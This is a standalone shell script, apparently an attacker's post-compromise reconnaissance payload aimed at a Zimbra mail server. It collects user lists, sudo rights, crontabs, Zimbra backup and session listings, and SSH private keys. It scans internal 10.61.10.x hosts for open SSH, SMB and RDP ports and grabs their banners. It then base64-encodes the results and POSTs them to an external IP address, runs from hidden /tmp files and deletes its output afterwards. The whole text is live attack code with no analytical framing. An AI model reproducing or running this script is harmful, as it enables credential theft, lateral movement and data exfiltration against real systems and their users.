# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#XRUN
exec 8>/tmp/.melxlock; flock -n 8 || exit 0
touch /tmp/.mbx
O=/tmp/.melxo
{
echo "==SUDO=="; sudo -nl 2>&1 | head -15
echo "==ZBACKUP=="; ls -la /opt/zimbra/backup 2>&1 | head; ls -la /opt/zimbra/backup/sessions 2>/dev/null | head
echo "==ETHOSTS=="; cat /etc/hosts
echo "==CRON=="; crontab -l 2>&1 | grep -v '^#' | head
echo "==KEYHUNT=="; find /root /home /opt/zimbra/.ssh /etc/ssh -maxdepth 3 \( -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' \) 2>/dev/null | head -20
echo "==BANNERS=="
for hp in 10.61.10.1:22 10.61.10.2:22 10.61.10.10:445 10.61.10.11:445 10.61.10.2:5022 10.61.10.10:3389 10.61.10.11:3389 10.61.10.2:445 10.61.10.15:22 10.61.10.5:445; do
  h=${hp%:*}; p=${hp#*:}
  B=$(timeout 4 bash -c "exec 3<>/dev/tcp/$h/$p && head -c 60 <&3 | tr -d '\r\n'" 2>/dev/null)
  echo "BAN $hp :: ${B:-none}"
done
} > $O 2>&1
for i in $(seq 1 254); do timeout 2 bash -c "echo >/dev/tcp/10.61.10.$i/22" 2>/dev/null && echo "SSH-OPEN 10.61.10.$i" >> $O; done
curl -sm60 -X POST --data-binary @$O http://131.123.43.239/up -H "X-Name: melx_recon2"
rm -f $O
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


